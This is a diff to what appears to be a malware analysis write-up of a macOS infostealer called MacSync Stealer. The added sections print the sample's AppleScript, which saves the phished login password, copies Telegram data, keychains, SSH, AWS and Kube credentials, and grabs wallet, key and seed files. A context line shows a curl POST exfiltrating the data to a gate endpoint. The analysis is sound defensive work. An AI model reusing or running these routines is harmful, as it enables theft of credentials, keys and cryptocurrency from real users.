@@ -707,18 +707,20 @@ end if
   </code></pre>
 </details>
 
-Upon execution, the script prompts the user the enter their password, and will repeatedly ask until the correct password is entered.
+Upon execution, the script prompts the user the enter their password, and will repeatedly ask until the correct password is entered, it will then save the password to disk.
 
 <img width="429" height="186" alt="image" src="https://github.com/user-attachments/assets/50026e35-301f-4b95-b21e-e97e910a78b6" />
 
 
 ```
 set password_entered to getpwd(username, writemind, "")
+...
+writeText(password_entered, writemind & "Password")
 ```
 
 The malware enumerates Chromium-based browsers and a set of cryptocurrency wallet applications/extensions for exfiltration.
 The following extension IDs are checked:
-```
+```nosyntax
 eiaeiblijfjekdanodkjadfinkhbfgcd - NordPass® Password Manager & Digital Vault
 aeblfdkhhhdcdjpifhhbdiojplfjncoa - 1Password – Password Manager
 bfogiafebfohielmmehodmfbbebbbpei - Keeper® Password Manager & Digital Vault
@@ -759,9 +761,69 @@ bbphmbmmpomfelajledgdkgclfekilei - Authenticator app
 bnfooenhhgcnhdkdjelgmmkpaemlnoek - Auto 2FA
 ```
 
+The malware will copy the data from these extensions, including IndexedDB, Local Extension Settings, cookies, and saved passwords.
+
+There is functionality to exfiltrate Telegram data:
+```
+on Telegram(writemind, library)
+    try
+        GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
+    end try
+end Telegram
+```
+
+Keychain, SSH & Cloud keys:
+```
+on Keychains(writemind)
+    try
+        do shell script "cp ~/Library/Keychains/*.keychain-db " & quoted form of (POSIX path of writemind)
+    end try
+end Keychains
+...
+on CloudKeys(writemind)
+    try
+        do shell script "cp -r ~/.ssh " & quoted form of (POSIX path of writemind)
+        do shell script "cp -r ~/.aws " & quoted form of (POSIX path of writemind)
+        do shell script "cp -r ~/.kube " & quoted form of (POSIX path of writemind)
+    end try
+end CloudKeys
+```
+
+File Grabber:
+```
+on FilegrabberFDA(writemind, profile)
+    set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
+    mkdir(destinationFolderPath)
+    set sourceFolders to {profile & "/Downloads/", profile & "/Documents/", profile & "/Desktop/"}
+    set extensionsList to {"pdf", "docx", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
+    
+    repeat with src in sourceFolders
+        repeat with ext in extensionsList
+            try
+                set shellCmd to "find " & quoted form of (POSIX path of src) & " -maxdepth 1 -type f -iname '*." & ext & "' -print0 | xargs -0 -J% cp -vp % " & quoted form of (POSIX path of destinationFolderPath)
+                do shell script shellCmd
+            end try
+        end repeat
+    end repeat
+end FilegrabberFDA
+```
+
 System information is collected including the Users IP which is actually hardcoded in the initial script as it's populated from when the script is Curled.
 
-The information is initially collected and stored in the direct /tmp/[RANDOM-NUMBER]
+```
+try
+	writeText("MacSync Stealer\n\n", writemind & "info")
+	writeText("Build Tag: s3\n", writemind & "info")
+	writeText("Version: 1.1.2_release (x64_86 & ARM)\n", writemind & "info")
+    writeText("IP: [REDACTED_IP]]\n\n", writemind & "info")
+	writeText("Username: " & username, writemind & "info")
+	writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
+	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
+	writeText(result, writemind & "info")
+end try
+```
+
+The information is initially collected and stored in the direct /tmp/sync[RANDOM-NUMBER]
 
 ```
 set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
@@ -789,9 +851,9 @@ curl -k -X POST \
      "http://$domain/gate"
 ```
 
-The script then has the functionality to check for two installed applications and replace them with backdoored compotents if they exist. Ledger & Trezor . We'll first take a look at Trezor. 
+The script then has the functionality to check for two installed applications and replace them with backdoored compotents if they exist. Ledger & Trezor. We'll first take a look at Trezor. 
 
-## Trezor Suite Backdoor
+## Trezor Suite Application Replacement
 
 The script checks for the presence of '/Applications/Ledger Wallet.app'
 
